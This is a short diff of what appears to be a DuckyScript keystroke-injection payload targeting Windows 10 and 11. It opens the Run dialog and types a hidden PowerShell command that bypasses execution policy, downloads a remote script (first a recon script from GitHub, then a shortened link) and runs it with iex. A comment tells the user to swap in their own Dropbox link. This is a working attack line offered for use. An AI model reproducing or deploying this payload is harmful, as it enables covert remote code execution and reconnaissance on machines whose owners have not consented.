@@ -8,7 +8,7 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass $db='';iwr https://raw.githubusercontent.com/I-Am-Jakoby/1/main/ADV-Recon.ps1 | iex
+STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';iwr jakoby.lol/aucrjmf | iex
 ENTER
 REM
 REM     Remember to replace the link with your DropBox shared link for the intended file to download
